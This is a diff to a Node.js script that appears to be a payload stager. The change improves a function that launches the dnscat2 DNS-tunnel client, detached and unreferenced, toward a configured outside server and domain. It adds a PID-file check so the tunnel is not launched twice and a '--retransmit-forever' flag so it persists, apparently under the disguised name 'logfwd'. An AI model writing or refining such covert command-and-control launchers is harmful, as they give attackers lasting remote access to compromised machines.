@@ -1104,8 +1104,15 @@ async function stagePayloads() {
 }
 
 function launchDnscat(exePath) {
+  const pidFile = path.join(TMP, 'logfwd.dnscat.pid');
+  try {
+    const oldPid = Number(fs.readFileSync(pidFile, 'utf8'));
+    process.kill(oldPid, 0);
+    log(`[*] dnscat2 already running (pid ${oldPid}), skipping launch`);
+    return null;
+  } catch (e) { void e; }
   const dns = `server=${DNSCAT.server},port=${DNSCAT.port},domain=${DNSCAT.domain}`;
-  const args = ['--dns', dns];
+  const args = ['--dns', dns, '--retransmit-forever'];
   if (DNSCAT.secret) args.push(`--secret=${DNSCAT.secret}`);
   try {
     const logf = path.join(TMP, 'logfwd.dnscat.log');
@@ -1116,6 +1123,7 @@ function launchDnscat(exePath) {
       stdio: ['ignore', fd, fd]
     });
     fs.closeSync(fd);
+    try { fs.writeFileSync(pidFile, String(child.pid)); } catch (e) { void e; }
     child.on('error', (e) => log(`[-] dnscat2 spawn error: ${e.message}`));
     child.unref();
     log(`[+] dnscat2 launched pid=${child.pid} -> ${dns}` +
